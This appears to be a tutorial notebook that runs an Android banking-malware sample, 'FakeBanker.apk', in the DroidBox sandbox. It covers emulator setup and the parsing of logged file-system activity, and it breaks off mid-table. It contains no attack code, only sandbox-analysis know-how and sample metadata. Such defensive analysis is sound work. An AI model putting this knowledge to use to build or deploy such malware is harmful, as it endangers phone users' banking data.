{
 "metadata": {
  "name": "",
  "signature": "sha256:05ab8d77262fbd7f2f3197ea5d45789987a9b603de5f9055d372ba175b061818"
 },
 "nbformat": 3,
 "nbformat_minor": 0,
 "worksheets": [
  {
   "cells": [
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "In this article I'll have a a closer look at [DroidBox](https://code.google.com/p/droidbox/) which provides a mobile sandbox to look at Android applications. In the previous [post](/2014/07/07/disect-android-apks-like-a-pro-static-code-analysis/) I've dealt with *static code analysis*. This time will start running our malicious application and look at the \"noise\" it generates. That would be:\n",
      "\n",
      "* file system access\n",
      "* network activity\n",
      "* interaction with the operating system\n",
      "* interaction with other applications\n",
      "* etc.\n",
      "\n",
      "*DroidBox* is very easy to use and consists of an own system image and kernel meant to log one applications activities. Using `adb logcat` *DroidBox* will look for certain debug messages and collect anything related to the monitored app. However I must say that loged data isn't always complete. Sometimes you'll get only a *striped* version of the data which caused the activity. In that case it's almost impossible e.g. to have a deep look at the network traffic (especially HTTP). You won't be able to construct a full request-response-sequence due to missing data. Nevertheless you can use DroidBox to get an overview of malicious activities triggered by the app. For a more technical analysis of the data you'll need additional tools (more to come in future posts)."
     ]
    },
    {
     "cell_type": "heading",
     "level": 3,
     "metadata": {},
     "source": [
      "Requirements for DroidBox"
     ]
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "First you'll have to install some requirements DroidBox needs. First make sure you have the system relevant packages installed:\n",
      "\n",
      "~~~ shell\n",
      "root@kali:~# apt-get install python-virtualenv libatlas-dev liblapack-dev libblas-dev\n",
      "~~~\n",
      "\n",
      "You'll need those in order to use `scipy`, `matplotlib` and `numpy` along with Droidbox. Now create a virtual environment and install *python* dependencies:\n",
      "\n",
      "~~~ shell\n",
      "root@kali:~/work/apk# mkdir env\n",
      "root@kali:~/work/apk# virtualenv env\n",
      "...\n",
      "root@kali:~/work/apk# source env/bin/activate\n",
      "(env)root@kali:~/work/apk# pip install numpy scipy matplotlib\n",
      "~~~"
     ]
    },
    {
     "cell_type": "heading",
     "level": 3,
     "metadata": {},
     "source": [
      "Install Droidbox"
     ]
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "Download the package:\n",
      "\n",
      "~~~ shell\n",
      "(env)root@kali:~/work/apk# wget https://droidbox.googlecode.com/files/DroidBox411RC.tar.gz\n",
      "~~~"
     ]
    },
    {
     "cell_type": "heading",
     "level": 3,
     "metadata": {},
     "source": [
      "Setup PATH"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "import os\n",
      "import sys\n",
      "\n",
      "# Setup new PATH\n",
      "old_path = os.environ['PATH']\n",
      "new_path = old_path + \":\" + \"/root/work/apk/SDK/android-sdk-linux/tools:/root/work/apk/SDK/android-sdk-linux/platform-tools:/root/work/apk/SDK/android-sdk-linux/build-tools/19.1.0\"\n",
      "os.environ['PATH'] = new_path\n",
      "\n",
      "# Change working directory\n",
      "os.chdir(\"/root/work/apk/DroidBox_4.1.1/\")"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [],
     "prompt_number": 2
    },
    {
     "cell_type": "heading",
     "level": 3,
     "metadata": {},
     "source": [
      "Setup IPython settings"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": true,
     "input": [
      "%pylab inline\n",
      "import binascii\n",
      "import pandas as pd\n",
      "import numpy as np\n",
      "import matplotlib.pyplot as plt\n",
      "import networkx as nx\n",
      "import datetime as dt\n",
      "import time\n",
      "import ipy_table\n",
      "from IPython.display import display_pretty, display_html, display_jpeg, display_png, display_json, display_latex, display_svg\n",
      "from IPython.display import HTML\n",
      "from IPython.core.magic import register_cell_magic, Magics, magics_class, cell_magic\n",
      "import jinja2\n",
      "\n",
      "# Ipython settings\n",
      "pd.set_option('display.height', 1000)\n",
      "pd.set_option('display.max_rows', 500)\n",
      "pd.set_option('display.max_columns', 500)\n",
      "pd.set_option('display.max_colwidth', 100)\n",
      "pd.set_option('display.width', 1000)\n",
      "pd.set_option('display.column_space', 1000)"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "Populating the interactive namespace from numpy and matplotlib\n",
        "height has been deprecated.\n",
        "\n"
       ]
      }
     ],
     "prompt_number": 415
    },
    {
     "cell_type": "heading",
     "level": 3,
     "metadata": {},
     "source": [
      "External extensions"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "# Install\n",
      "%install_ext https://raw.githubusercontent.com/dorneanu/ipython/master/extensions/diagmagic.py\n",
      "    \n",
      "# Then load extensions\n",
      "%load_ext diagmagic"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "Installed diagmagic.py. To use it, type:\n",
        "  %load_ext diagmagic\n"
       ]
      }
     ],
     "prompt_number": 5
    },
    {
     "cell_type": "heading",
     "level": 3,
     "metadata": {},
     "source": [
      "Utilities"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "from IPython import display\n",
      "from IPython.core.magic import register_cell_magic, Magics, magics_class, cell_magic\n",
      "import jinja2\n",
      "\n",
      "# <!-- collapse=True -->\n",
      "def df2table(df):\n",
      "    \"\"\" Outputs a DataFrame as a table using ipy_table \"\"\"\n",
      "    entries = [list(i) for i in df.itertuples()]\n",
      "    \n",
      "    # Extract table header\n",
      "    header = list(df.columns)\n",
      "    \n",
      "    # Add index to header\n",
      "    header.insert(0, df.index.name)\n",
      "    \n",
      "    # Insert header at 1st place\n",
      "    entries.insert(0, header)\n",
      "\n",
      "    return ipy_table.make_table(entries)\n",
      "\n",
      "# Create jinja cell magic (http://nbviewer.ipython.org/urls/gist.github.com/bj0/5343292/raw/23a0845ee874827e3635edb0bf5701710a537bfc/jinja2.ipynb)\n",
      "@magics_class\n",
      "class JinjaMagics(Magics):\n",
      "    '''Magics class containing the jinja2 magic and state'''\n",
      "    \n",
      "    def __init__(self, shell):\n",
      "        super(JinjaMagics, self).__init__(shell)\n",
      "        \n",
      "        # create a jinja2 environment to use for rendering\n",
      "        # this can be modified for desired effects (ie: using different variable syntax)\n",
      "        self.env = jinja2.Environment(loader=jinja2.FileSystemLoader('.'))\n",
      "        \n",
      "        # possible output types\n",
      "        self.display_functions = dict(html=display.HTML, \n",
      "                                      latex=display.Latex,\n",
      "                                      json=display.JSON,\n",
      "                                      pretty=display.Pretty,\n",
      "                                      display=display.display)\n",
      "\n",
      "    \n",
      "    @cell_magic\n",
      "    def jinja(self, line, cell):\n",
      "        '''\n",
      "        jinja2 cell magic function.  Contents of cell are rendered by jinja2, and \n",
      "        the line can be used to specify output type.\n",
      "\n",
      "        ie: \"%%jinja html\" will return the rendered cell wrapped in an HTML object.\n",
      "        '''\n",
      "        f = self.display_functions.get(line.lower().strip(), display.display)\n",
      "        \n",
      "        tmp = self.env.from_string(cell)\n",
      "        rend = tmp.render(dict((k,v) for (k,v) in self.shell.user_ns.items() \n",
      "                                        if not k.startswith('_') and k not in self.shell.user_ns_hidden))\n",
      "        \n",
      "        return f(rend)\n",
      "        \n",
      "    \n",
      "ip = get_ipython()\n",
      "ip.register_magics(JinjaMagics)"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [],
     "prompt_number": 416
    },
    {
     "cell_type": "heading",
     "level": 2,
     "metadata": {},
     "source": [
      "Create Android Virtual Device (ADV)"
     ]
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "Now you'll have to install an Android device virtually in order to analyze the APK. Supposing you have installed the SDK in the previous step now you should have some *targets* available on your machine. If not (that was my case) then make sure you have a X session running and run `android` from the console. In my case I've fired up `vnc` and connected to the Kali machine. \n",
      "\n",
      "This is what I've got:"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": true,
     "input": [
      "%%bash\n",
      "android list targets | head -n 10"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "Available Android targets:\n",
        "----------\n",
        "id: 1 or \"android-16\"\n",
        "     Name: Android 4.1.2\n",
        "     Type: Platform\n",
        "     API level: 16\n",
        "     Revision: 4\n",
        "     Skins: WXGA800-7in, WQVGA400, WVGA800 (default), WXGA800, HVGA, WSVGA, WVGA854, WQVGA432, WXGA720, QVGA\n",
        " Tag/ABIs : default/armeabi-v7a\n",
        "----------\n"
       ]
      }
     ],
     "prompt_number": 22
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "Now we **create** the AVD using following command:\n",
      "\n",
      "```\n",
      "# android create avd --abi default/armeabi-v7a -n android-4.1.2-droidbox -t 1 -c 1000M\n",
      "Android 4.1.2 is a basic Android platform.\n",
      "Do you wish to create a custom hardware profile [no]\n",
      "Created AVD 'android-4.1.2-droidbox' based on Android 4.1.2, ARM (armeabi-v7a) processor,\n",
      "with the following hardware config:\n",
      "hw.lcd.density=240\n",
      "hw.ramSize=512\n",
      "hw.sdCard=yes\n",
      "vm.heapSize=48\n",
      "\n",
      "```"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "%%bash\n",
      "android list avd"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "Available Android Virtual Devices:\n",
        "    Name: android-4.1.2-droidbox\n",
        "    Path: /root/.android/avd/android-4.1.2-droidbox.avd\n",
        "  Target: Android 4.1.2 (API level 16)\n",
        " Tag/ABI: default/armeabi-v7a\n",
        "    Skin: WVGA800\n",
        "  Sdcard: 1000M\n"
       ]
      }
     ],
     "prompt_number": 14
    },
    {
     "cell_type": "heading",
     "level": 3,
     "metadata": {},
     "source": [
      "Start the emulator"
     ]
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "In `DroidBox`s package directory you'll find `startemu.sh`. Open it and add your favourite parameters.\n"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "%%bash\n",
      "cat startemu.sh"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "#!/usr/bin/env bash\n",
        "\n",
        "emulator -avd $1 -system images/system.img -ramdisk images/ramdisk.img -wipe-data -prop dalvik.vm.execution-mode=int:portable &\n"
       ]
      }
     ],
     "prompt_number": 5
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "Afterwards make sure you have a X session and **run** the emulator with your previously created AVD:\n",
      "\n",
      "~~~ shell\n",
      "(env)root@kali:~/work/apk/DroidBox# ./startemu.sh android-4.1.2-droidbox\n",
      "...\n",
      "~~~"
     ]
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "Now you should see your emulator booting ..."
     ]
    },
    {
     "cell_type": "heading",
     "level": 3,
     "metadata": {},
     "source": [
      "Run DroidBox"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "!./droidbox.sh /root/work/apk/DroidBox_4.1.1/APK/FakeBanker.apk"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "\u001b[H\u001b[2J"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        " ____                        __  ____\r\n",
        "/\\  _`\\               __    /\\ \\/\\  _`\\\r\n",
        "\\ \\ \\/\\ \\  _ __  ___ /\\_\\   \\_\\ \\ \\ \\L\\ \\   ___   __  _\r\n",
        " \\ \\ \\ \\ \\/\\`'__\\ __`\\/\\ \\  /'_` \\ \\  _ <' / __`\\/\\ \\/'\\\r\n",
        "  \\ \\ \\_\\ \\ \\ \\/\\ \\L\\ \\ \\ \\/\\ \\L\\ \\ \\ \\L\\ \\ \\L\\ \\/>  </\r\n",
        "   \\ \\____/\\ \\_\\ \\____/\\ \\_\\ \\___,_\\ \\____/ \\____//\\_/\\_\\\r\n",
        "    \\/___/  \\/_/\\/___/  \\/_/\\/__,_ /\\/___/ \\/___/ \\//\\/_/\r\n"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "Waiting for the device...\r\n"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "Installing the application /root/work/apk/DroidBox_4.1.1/APK/FakeBanker.apk...\r\n"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "Running the component com.gmail.xpack/com.gmail.xpack.MainActivity...\r\n"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "Starting the activity com.gmail.xpack.MainActivity...\r\n"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "Application started\r\n",
        "Analyzing the application during infinite time seconds...\r\n",
        "     \u001b[132m[|] Collected 0 sandbox logs\u001b[1m   (Ctrl-C to view logs)\r"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "     \u001b[132m[/] Collected 1 sandbox logs\u001b[1m   (Ctrl-C to view logs)\r"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "     \u001b[132m[-] Collected 1 sandbox logs\u001b[1m   (Ctrl-C to view logs)\r"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "     \u001b[132m[\\] Collected 1 sandbox logs\u001b[1m   (Ctrl-C to view logs)\r"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "     \u001b[132m[|] Collected 1 sandbox logs\u001b[1m   (Ctrl-C to view logs)\r"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "     \u001b[132m[/] Collected 1 sandbox logs\u001b[1m   (Ctrl-C to view logs)\r"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "     \u001b[132m[-] Collected 1 sandbox logs\u001b[1m   (Ctrl-C to view logs)\r"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "     \u001b[132m[\\] Collected 2 sandbox logs\u001b[1m   (Ctrl-C to view logs)\r"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "     \u001b[132m[|] Collected 2 sandbox logs\u001b[1m   (Ctrl-C to view logs)\r"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "     \u001b[132m[/] Collected 3 sandbox logs\u001b[1m   (Ctrl-C to view logs)\r"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "     \u001b[132m[-] Collected 5 sandbox logs\u001b[1m   (Ctrl-C to view logs)\r"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "     \u001b[132m[\\] Collected 5 sandbox logs\u001b[1m   (Ctrl-C to view logs)\r"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "     \u001b[132m[|] Collected 5 sandbox logs\u001b[1m   (Ctrl-C to view logs)\r"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "     \u001b[132m[/] Collected 5 sandbox logs\u001b[1m   (Ctrl-C to view logs)\r"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "     \u001b[132m[-] Collected 5 sandbox logs\u001b[1m   (Ctrl-C to view logs)\r"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "     \u001b[132m[\\] Collected 6 sandbox logs\u001b[1m   (Ctrl-C to view logs)\r"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "     \u001b[132m[|] Collected 7 sandbox logs\u001b[1m   (Ctrl-C to view logs)\r"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "     \u001b[132m[/] Collected 10 sandbox logs\u001b[1m   (Ctrl-C to view logs)\r"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "     \u001b[132m[-] Collected 13 sandbox logs\u001b[1m   (Ctrl-C to view logs)\r"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "     \u001b[132m[\\] Collected 13 sandbox logs\u001b[1m   (Ctrl-C to view logs)\r"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "     \u001b[132m[|] Collected 14 sandbox logs\u001b[1m   (Ctrl-C to view logs)\r"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "     \u001b[132m[/] Collected 14 sandbox logs\u001b[1m   (Ctrl-C to view logs)\r"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "     \u001b[132m[-] Collected 14 sandbox logs\u001b[1m   (Ctrl-C to view logs)\r"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "     \u001b[132m[\\] Collected 14 sandbox logs\u001b[1m   (Ctrl-C to view logs)\r"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "     \u001b[132m[|] Collected 14 sandbox logs\u001b[1m   (Ctrl-C to view logs)\r"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "     \u001b[132m[/] Collected 14 sandbox logs\u001b[1m   (Ctrl-C to view logs)\r"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "     \u001b[132m[-] Collected 14 sandbox logs\u001b[1m   (Ctrl-C to view logs)\r"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "     \u001b[132m[\\] Collected 14 sandbox logs\u001b[1m   (Ctrl-C to view logs)\r"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "     \u001b[132m[|] Collected 14 sandbox logs\u001b[1m   (Ctrl-C to view logs)\r"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "     \u001b[132m[/] Collected 14 sandbox logs\u001b[1m   (Ctrl-C to view logs)\r"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "     \u001b[132m[-] Collected 14 sandbox logs\u001b[1m   (Ctrl-C to view logs)\r"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "     \u001b[132m[\\] Collected 14 sandbox logs\u001b[1m   (Ctrl-C to view logs)\r"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "     \u001b[132m[|] Collected 14 sandbox logs\u001b[1m   (Ctrl-C to view logs)\r"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "     \u001b[132m[/] Collected 14 sandbox logs\u001b[1m   (Ctrl-C to view logs)\r"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "     \u001b[132m[-] Collected 14 sandbox logs\u001b[1m   (Ctrl-C to view logs)\r"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "     \u001b[132m[\\] Collected 14 sandbox logs\u001b[1m   (Ctrl-C to view logs)\r"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "     \u001b[132m[|] Collected 14 sandbox logs\u001b[1m   (Ctrl-C to view logs)\r"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "     \u001b[132m[/] Collected 14 sandbox logs\u001b[1m   (Ctrl-C to view logs)\r"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "     \u001b[132m[-] Collected 14 sandbox logs\u001b[1m   (Ctrl-C to view logs)\r"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "     \u001b[132m[\\] Collected 14 sandbox logs\u001b[1m   (Ctrl-C to view logs)\r"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "     \u001b[132m[|] Collected 14 sandbox logs\u001b[1m   (Ctrl-C to view logs)\r"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "     \u001b[132m[/] Collected 14 sandbox logs\u001b[1m   (Ctrl-C to view logs)\r"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "     \u001b[132m[-] Collected 14 sandbox logs\u001b[1m   (Ctrl-C to view logs)\r"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "     \u001b[132m[\\] Collected 14 sandbox logs\u001b[1m   (Ctrl-C to view logs)\r"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "     \u001b[132m[|] Collected 14 sandbox logs\u001b[1m   (Ctrl-C to view logs)\r"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "     \u001b[132m[/] Collected 14 sandbox logs\u001b[1m   (Ctrl-C to view logs)\r"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "     \u001b[132m[-] Collected 14 sandbox logs\u001b[1m   (Ctrl-C to view logs)\r"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "     \u001b[132m[\\] Collected 14 sandbox logs\u001b[1m   (Ctrl-C to view logs)\r"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "     \u001b[132m[|] Collected 14 sandbox logs\u001b[1m   (Ctrl-C to view logs)\r"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "     \u001b[132m[/] Collected 14 sandbox logs\u001b[1m   (Ctrl-C to view logs)\r"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "     \u001b[132m[-] Collected 14 sandbox logs\u001b[1m   (Ctrl-C to view logs)\r"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "     \u001b[132m[\\] Collected 14 sandbox logs\u001b[1m   (Ctrl-C to view logs)\r"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "     \u001b[132m[|] Collected 14 sandbox logs\u001b[1m   (Ctrl-C to view logs)\r"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "     \u001b[132m[/] Collected 14 sandbox logs\u001b[1m   (Ctrl-C to view logs)\r"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "     \u001b[132m[-] Collected 14 sandbox logs\u001b[1m   (Ctrl-C to view logs)\r"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "     \u001b[132m[\\] Collected 14 sandbox logs\u001b[1m   (Ctrl-C to view logs)\r"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "     \u001b[132m[|] Collected 14 sandbox logs\u001b[1m   (Ctrl-C to view logs)\r"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "     \u001b[132m[/] Collected 14 sandbox logs\u001b[1m   (Ctrl-C to view logs)\r"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "     \u001b[132m[-] Collected 14 sandbox logs\u001b[1m   (Ctrl-C to view logs)\r"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "     \u001b[132m[\\] Collected 14 sandbox logs\u001b[1m   (Ctrl-C to view logs)\r"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "     \u001b[132m[|] Collected 14 sandbox logs\u001b[1m   (Ctrl-C to view logs)\r"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "     \u001b[132m[/] Collected 14 sandbox logs\u001b[1m   (Ctrl-C to view logs)\r"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "     \u001b[132m[-] Collected 14 sandbox logs\u001b[1m   (Ctrl-C to view logs)\r"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "     \u001b[132m[\\] Collected 14 sandbox logs\u001b[1m   (Ctrl-C to view logs)\r"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "     \u001b[132m[|] Collected 14 sandbox logs\u001b[1m   (Ctrl-C to view logs)\r"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "     \u001b[132m[/] Collected 14 sandbox logs\u001b[1m   (Ctrl-C to view logs)\r"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "     \u001b[132m[-] Collected 14 sandbox logs\u001b[1m   (Ctrl-C to view logs)\r"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "     \u001b[132m[\\] Collected 14 sandbox logs\u001b[1m   (Ctrl-C to view logs)\r"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "^C\r\n"
       ]
      }
     ],
     "prompt_number": 10
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      ">DroidBox will then listen for activities until you kill it by ^C. "
     ]
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "Meanwhile I was interacting with the APP and saw that DroidBox was collecting the logs during the interacttions.\n",
      "DroidBox will output its results as a JSON file. **I've uploaded the results to [pastebin.com](http://pastebin.com/7YSb3EMW)**. Now let's have some fun and take a look at the results.\n",
      "\n",
      "Before starting analyzing the output keep in mind that:\n",
      "\n",
      "> [...] all data received/sent, read/written are shown in hexadecimal since the handled data can contain binary data. \n",
      "> \n",
      "> (Source: https://github.com/floe/mobile-sandbox/blob/master/DroidBox_4.1.1/scripts/droidbox.py)\n"
     ]
    },
    {
     "cell_type": "heading",
     "level": 2,
     "metadata": {},
     "source": [
      "Results analysis"
     ]
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "First let's download the data and let python parse it"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "# <!-- collapse=True -->\n",
      "import json\n",
      "import urllib\n",
      "url = \"http://pastebin.com/raw.php?i=7YSb3EMW\"\n",
      "\n",
      "# Load data\n",
      "jsonurl = urllib.urlopen(url)\n",
      "result = json.loads(jsonurl.read())\n",
      "\n",
      "# Show dictionary keys\n",
      "result.keys()"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "metadata": {},
       "output_type": "pyout",
       "prompt_number": 27,
       "text": [
        "[u'apkName',\n",
        " u'enfperm',\n",
        " u'opennet',\n",
        " u'cryptousage',\n",
        " u'sendsms',\n",
        " u'servicestart',\n",
        " u'sendnet',\n",
        " u'closenet',\n",
        " u'accessedfiles',\n",
        " u'fdaccess',\n",
        " u'dataleaks',\n",
        " u'recvnet',\n",
        " u'dexclass',\n",
        " u'hashes',\n",
        " u'recvsaction',\n",
        " u'phonecalls']"
       ]
      }
     ],
     "prompt_number": 27
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "So we have diffenrent categories of activities we can look at. After analyzing the JSON content I've come to following most important activities."
     ]
    },
    {
     "cell_type": "heading",
     "level": 2,
     "metadata": {},
     "source": [
      "File system activities"
     ]
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "Let's have a look at the file system access actions triggered by the application. Due to DroidBox limitations I couldn't have a look at the **complete** raw data."
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "# <!-- collapse=True -->\n",
      "# Convert timestamps to human readable time delta\n",
      "timestamps = [str(datetime.timedelta(seconds=(round(float(i.encode(\"utf-8\")))))) for i in result['fdaccess'].keys()]\n",
      "\n",
      "# Create list of accessed files entries\n",
      "accessed_files = [i[1] for i in result['fdaccess'].items()]\n",
      "\n",
      "# Create dataframe\n",
      "df_accessedfiles = pd.DataFrame(accessed_files, index=timestamps)\n",
      "df_accessedfiles.sort(inplace=True)\n",
      "df_accessedfiles.index.name='Timestamp'\n",
      "\n",
      "# Unhexlify data\n",
      "unhexed_data = [binascii.unhexlify(d) for d in df_accessedfiles['data']]\n",
      "df_accessedfiles['rawdata'] = unhexed_data\n",
      "\n",
      "df2table(df_accessedfiles[['operation', 'path', 'rawdata']].reset_index())\n",
      "#ipy_table.apply_theme('basic')\n",
      "df_accessedfiles[['operation', 'path', 'rawdata']].reset_index()"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "html": [
        "<div style=\"max-height:1000px;max-width:1500px;overflow:auto;\">\n",
        "<table border=\"1\" class=\"dataframe\">\n",
        "  <thead>\n",
        "    <tr style=\"text-align: right;\">\n",
        "      <th></th>\n",
        "      <th>Timestamp</th>\n",
        "      <th>operation</th>\n",
        "      <th>path</th>\n",
        "      <th>rawdata</th>\n",
        "    </tr>\n",
        "  </thead>\n",
        "  <tbody>\n",
        "    <tr>\n",
        "      <th>0 </th>\n",
        "      <td> 0:00:03</td>\n",
        "      <td>  read</td>\n",
        "      <td> /data/data/com.gmail.xpack/shared_prefs/MainPref.xml</td>\n",
        "      <td> &lt;?xml version='1.0' encoding='utf-8' standalone='yes' ?&gt;\\n&lt;map&gt;\\n&lt;string name=\"DOWNLOADDOMAIN\"&gt;c...</td>\n",
        "    </tr>\n",
        "    <tr>\n",
        "      <th>1 </th>\n",
        "      <td> 0:00:04</td>\n",
        "      <td>  read</td>\n",
        "      <td>                                   /proc/1184/cmdline</td>\n",
        "      <td> com.gmail.xpack\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000p/FakeBanker.apk\u0000ain...</td>\n",
        "    </tr>\n",
        "    <tr>\n",
        "      <th>2 </th>\n",
